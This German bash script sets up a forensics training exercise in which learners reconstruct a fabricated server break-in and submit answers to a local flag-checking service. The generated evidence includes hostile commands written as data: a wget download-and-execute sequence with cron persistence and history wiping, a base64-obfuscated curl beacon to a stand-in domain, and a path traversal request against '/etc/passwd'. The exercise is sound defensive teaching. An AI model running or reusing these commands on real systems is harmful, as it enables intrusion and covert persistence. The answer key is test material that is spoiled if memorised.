#!/bin/bash
# „Der Einbruch“ – Experten-Arena (Blue Team / Forensik): Ein Server wurde gehackt. Aus Protokollen, Verlauf,
# Cronjobs, verschleierter Schadsoftware und Webserver-Log rekonstruierst du den Angriff.
# Antworten prüft die „Ermittlungsakte“ (Dienst auf Port 7000, Befehl: akte). Codes: KLY{ sha256("<salz>:einbruch:lN")[:16] }.
# Alle Daten sind erfunden; IP-Adressen aus Dokumentationsbereichen (RFC 5737), Domains unter example.net.
set -euo pipefail
TOKEN="${KLY_TOKEN:-}"
[[ "$TOKEN" =~ ^KLY-[0-9A-F]{6}$ ]] || { echo "FEHLER: KLY_TOKEN fehlt oder ist ungültig." >&2; exit 2; }
SALZ="${KLY_SALZ:-}"; [[ "$SALZ" =~ ^[0-9a-f]{32}$ ]] || SALZ="$TOKEN"   # Arena: geheimes Salz vom Server; sonst (eigenes Kali) der Token
unset KLY_SALZ

useradd -m -s /bin/bash ermittler; echo 'ermittler:ermittler' | chpasswd; chmod 700 /home/ermittler; rm -f /home/ermittler/.bash_logout
useradd -r -s /usr/sbin/nologin akte
passwd -l root >/dev/null
install -d -m 755 /beweise /beweise/schadsoftware
install -d -o akte -g akte -m 700 /opt/akte

# Alle Spuren und Antworten werden aus dem Salz erzeugt – jede Person hat ihren eigenen Fall.
python3 - "$SALZ" <<'PY'
import sys, random, hashlib, base64, json, os
salz = sys.argv[1]
r = random.Random(hashlib.sha256((salz + ':einbruch:fall').encode()).hexdigest())
code = lambda n: 'KLY{' + hashlib.sha256(f'{salz}:einbruch:l{n}'.encode()).hexdigest()[:16] + '}'
hexx = lambda n: ''.join(r.choice('0123456789abcdef') for _ in range(n))
namen = ['mueller', 'schmidt', 'weber', 'wagner', 'becker', 'hoffmann', 'koch', 'richter', 'klein', 'wolf', 'neumann', 'braun', 'zimmermann', 'krause', 'hartmann', 'lange', 'werner', 'lehmann', 'schulz', 'peters']
opfer = r.choice(namen)
angreifer = f'203.0.113.{r.randrange(2, 250)}'
koeder = [f'198.51.100.{r.randrange(2, 250)}' for _ in range(4)] + [f'192.0.2.{r.randrange(2, 250)}' for _ in range(3)]
domain = f'upd-{hexx(6)}.example.net'
datei = r.choice(['systemd-helper', 'kworker-update', 'dbus-sync', 'cron-check', 'logrotate-fix']) + f'-{hexx(3)}.sh'
url = f'http://{domain}/dl/{datei}'
versteck = f'/var/tmp/.{r.choice(["cache", "font", "x11", "ice"])}-{hexx(4)}/{r.choice(["sync", "upd", "helper"])}'
beute = f'kunden-{hexx(5)}.csv'

# ---------- auth.log
z = []
def t(h, m, s): return (h, m, s)
for _ in range(2500):  # Alltag
    n = r.choice(namen); ip = f'10.20.{r.randrange(1, 9)}.{r.randrange(2, 250)}'; h = r.randrange(7, 19)
    ok = r.random() < 0.93
    z.append((t(h, r.randrange(60), r.randrange(60)), f'sshd[{r.randrange(1000, 60000)}]: {"Accepted password" if ok else "Failed password"} for {n} from {ip} port {r.randrange(30000, 65000)} ssh2'))
for ip in koeder:  # kleine Scanner (Köder)
    for _ in range(r.randrange(5, 40)):
        z.append((t(r.randrange(0, 24), r.randrange(60), r.randrange(60)), f'sshd[{r.randrange(1000, 60000)}]: Failed password for invalid user {r.choice(["admin", "root", "test", "oracle", "pi", "ubuntu"])} from {ip} port {r.randrange(30000, 65000)} ssh2'))
start = 2 * 3600 + r.randrange(0, 1800)  # Angriff nachts
for i in range(420):
    s = start + i * 3; u = r.choice(['admin', 'root', 'test', 'user', 'support'] + namen)
    z.append((t(s // 3600, s // 60 % 60, s % 60), f'sshd[{r.randrange(1000, 60000)}]: Failed password for {"invalid user " if u not in namen else ""}{u} from {angreifer} port {r.randrange(30000, 65000)} ssh2'))
s = start + 420 * 3 + 7; zeit_erfolg = f'{s // 3600:02d}:{s // 60 % 60:02d}:{s % 60:02d}'
z.append((t(s // 3600, s // 60 % 60, s % 60), f'sshd[{r.randrange(1000, 60000)}]: Accepted password for {opfer} from {angreifer} port {r.randrange(30000, 65000)} ssh2'))
z.sort()
with open('/beweise/auth.log', 'w') as f:
    for (h, m, s), x in z: f.write(f'Nov  3 {h:02d}:{m:02d}:{s:02d} kontor {x}\n')

# ---------- Verlauf des Opfers
with open(f'/beweise/bash_history_{opfer}', 'w') as f:
    f.write('\n'.join(['ls -la', 'cd /tmp', 'uname -a', 'id', 'cat /etc/passwd | wc -l', f'wget -q {url} -O /tmp/{datei}', f'chmod +x /tmp/{datei}', f'/tmp/{datei}',
                       f'mkdir -p {os.path.dirname(versteck)}', f'cp /tmp/{datei} {versteck}', f'(crontab -l; echo "*/5 * * * * {versteck} >/dev/null 2>&1") | crontab -', f'rm /tmp/{datei}', 'history -c', 'exit']) + '\n')

# ---------- Crontab des Opfers (mit echten Einträgen dazwischen)
with open(f'/beweise/crontab_{opfer}.txt', 'w') as f:
    f.write(f'# Gesichert am 03.11. von der Sicherheitsabteilung\nMAILTO=""\n15 3 * * * /usr/local/bin/backup.sh --quiet\n0 6 * * 1 /usr/bin/find /home/{opfer}/tmp -mtime +7 -delete\n*/5 * * * * {versteck} >/dev/null 2>&1\n30 22 * * * /usr/bin/python3 /opt/berichte/tagesbericht.py\n')

# ---------- Schadsoftware (verschleiert)
innen = f'#!/bin/bash\nwhile true; do\n  curl -s -m 5 -X POST -d "id=$(hostname)" https://{domain}/beacon\n  sleep 300\ndone\n'
with open(f'/beweise/schadsoftware/{os.path.basename(versteck)}', 'w') as f:
    f.write('#!/bin/bash\n# system maintenance helper\n' + f'eval "$(echo {base64.b64encode(innen.encode()).decode()} | base64 -d)"\n')

# ---------- Webserver-Protokoll
w = []
pfade = ['/', '/produkte', '/kontakt', '/impressum', '/bilder/logo.png', '/suche?q=tee', '/warenkorb']
for _ in range(3000):
    ip = f'10.30.{r.randrange(1, 9)}.{r.randrange(2, 250)}' if r.random() < 0.6 else f'198.51.100.{r.randrange(2, 250)}'
    w.append((r.randrange(0, 86400), f'{ip} - - [03/Nov/2026:%s +0100] "GET {r.choice(pfade)} HTTP/1.1" 200 {r.randrange(300, 9000)}'))
s0 = start + 420 * 3 + 600
for i, (p, st, gr) in enumerate([('/export', 400, 120), ('/export?datei=../../etc/passwd', 403, 140), ('/export?datei=test.csv', 404, 130),
                                  (f'/export?datei={beute}', 200, r.randrange(2_000_000, 9_000_000)), ('/export?datei=lieferanten.csv', 404, 130)]):
    w.append((s0 + i * 20, f'{angreifer} - - [03/Nov/2026:%s +0100] "GET {p} HTTP/1.1" {st} {gr}'))
for k in koeder[:3]:
    w.append((r.randrange(0, 86400), f'{k} - - [03/Nov/2026:%s +0100] "GET /export?datei=preise.csv HTTP/1.1" 404 130'))
w.sort()
with open('/beweise/access.log', 'w') as f:
    for s, x in w: f.write(x % f'{s // 3600:02d}:{s // 60 % 60:02d}:{s % 60:02d}' + '\n')

# ---------- Antworten (nur der Akten-Dienst kann sie lesen)
akte = {'1': [angreifer], '2': [f'{opfer} {zeit_erfolg}'], '3': [url], '4': [versteck], '5': [domain], '6': [beute]}
json.dump({'antworten': akte, 'codes': {str(n): code(n) for n in range(1, 7)}}, open('/opt/akte/fall.json', 'w'))
PY
chown akte:akte /opt/akte/fall.json; chmod 400 /opt/akte/fall.json
find /beweise -type f -exec chmod 644 {} +; chmod 755 /beweise /beweise/schadsoftware

cat > /opt/akte/dienst.py <<'PY'
import socket, threading, json, time
F = json.load(open('/opt/akte/fall.json'))
FRAGEN = {
 '1': 'Von welcher IP-Adresse kam der Passwort-Angriff (Brute Force) auf SSH?',
 '2': 'Welches Konto wurde geknackt – und wann genau? Antwort:  KONTO HH:MM:SS',
 '3': 'Von welcher vollständigen Adresse (URL) hat der Angreifer sein Werkzeug geladen?',
 '4': 'Welche Datei (voller Pfad) startet der Angreifer alle 5 Minuten neu?',
 '5': 'Mit welcher Domain nimmt die Schadsoftware Kontakt auf? (Sie ist verschleiert.)',
 '6': 'Welche Kundendatei wurde über den Webserver gestohlen? (Dateiname)',
}
sperre = {}
norm = lambda s: ' '.join(s.strip().lower().split())
def kunde(c):
    f = c.makefile('rw', encoding='utf-8', errors='replace', newline='\n')
    f.write('ERMITTLUNGSAKTE bereit. FRAGEN | ANTWORT <nr> <text> | ENDE\n'); f.flush()
    for zeile in f:
        t = zeile.strip().split(' ', 2)
        if not t or not t[0]: continue
        b = t[0].upper()
        if b == 'ENDE': break
        if b == 'FRAGEN': f.write(''.join(f'{k}) {v}\n' for k, v in FRAGEN.items()))
        elif b == 'ANTWORT' and len(t) == 3 and t[1] in FRAGEN:
            n = t[1]; jetzt = time.time()
            if sperre.get(n, (0, 0))[1] > jetzt: f.write(f'GESPERRT – zu viele falsche Antworten, noch {int(sperre[n][1] - jetzt)} s warten.\n')
            elif norm(t[2]) in [norm(a) for a in F['antworten'][n]]:
                sperre.pop(n, None); f.write(f'RICHTIG! Code {n}: {F["codes"][n]}\n')
            else:
                fehl = sperre.get(n, (0, 0))[0] + 1
                sperre[n] = (0, jetzt + 60) if fehl >= 5 else (fehl, 0)   # nach 5 Fehlversuchen 60 s Pause
                f.write('FALSCH. Schau noch einmal genau in die Beweise.\n')
        else: f.write('Befehle: FRAGEN | ANTWORT <nr> <text> | ENDE\n')
        f.flush(); time.sleep(0.5)
    try: f.close()
    except Exception: pass
    c.close()
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(('127.0.0.1', 7000)); s.listen(8)
while True:
    c, _ = s.accept(); threading.Thread(target=kunde, args=(c,), daemon=True).start()
PY
chown akte:akte /opt/akte/dienst.py; chmod 400 /opt/akte/dienst.py
cat > /usr/local/bin/akte <<'A'
#!/bin/bash
# Ermittlungsakte:  akte fragen   |   akte <nr> <antwort>
if [ "${1:-fragen}" = fragen ]; then printf 'FRAGEN\nENDE\n' | nc -q 2 localhost 7000 | tail -n +2; exit; fi
n=$1; shift; printf 'ANTWORT %s %s\nENDE\n' "$n" "$*" | nc -q 2 localhost 7000 | tail -n +2
A
chmod 755 /usr/local/bin/akte

cat > /etc/motd <<'M'

  ┌────────────────────────────────────────────────────────────┐
  │  KRÄUTERKONTOR · Sicherheitsvorfall vom 03.11.             │
  │  Übungssystem (Nachtfalter Profi-Arena) – alles erfunden.  │
  └────────────────────────────────────────────────────────────┘
  Lies ~/fall.txt. Die Beweise liegen in /beweise.  Fragen: akte fragen

M
cat > /home/ermittler/fall.txt <<'T'
FALL „KRÄUTERKONTOR“ – du bist die Ermittlerin / der Ermittler

In der Nacht zum 03.11. ist jemand in den Server eingebrochen. Die Kolleginnen haben Beweise gesichert:

  /beweise/auth.log                 SSH-Anmeldungen (erfolgreich und fehlgeschlagen)
  /beweise/bash_history_*           Befehlsverlauf des geknackten Kontos
  /beweise/crontab_*.txt            geplante Aufgaben dieses Kontos
  /beweise/schadsoftware/           das gefundene Programm (NICHT ausführen – nur lesen!)
  /beweise/access.log               Webserver-Protokoll

Beantworte die Fragen der Ermittlungsakte. Jede richtige Antwort gibt einen Code.
  akte fragen                       alle Fragen anzeigen
  akte 1 203.0.113.99               Antwort auf Frage 1 abgeben

Werkzeuge, die helfen:  grep, awk '{print $11}', sort, uniq -c, sort -rn, head, cut, less, base64 -d
Tipp: Erst zählen, dann lesen.   grep "Failed password" /beweise/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head
Nach 5 falschen Antworten auf eine Frage ist sie 60 Sekunden gesperrt.

Zum Schluss: Was hätte den Einbruch verhindert? (Fail2Ban, Schlüssel statt Passwörter, Pfad-Prüfung im Export …)
T
chown ermittler:ermittler /home/ermittler/fall.txt

runuser -u akte -- env -i PATH=/usr/bin:/bin python3 /opt/akte/dienst.py >/dev/null 2>&1 &
cat > /etc/ssh/sshd_config.d/einbruch.conf <<'C'
PermitRootLogin no
PasswordAuthentication yes
KbdInteractiveAuthentication no
AllowTcpForwarding no
X11Forwarding no
AllowAgentForwarding no
PermitTunnel no
PrintMotd yes
MaxAuthTries 6
C
ssh-keygen -A >/dev/null
for _ in $(seq 1 30); do nc -z 127.0.0.1 7000 && break; sleep 0.2; done
echo "nf-einbruch: Einbruch bereit."
exec /usr/sbin/sshd -D -e
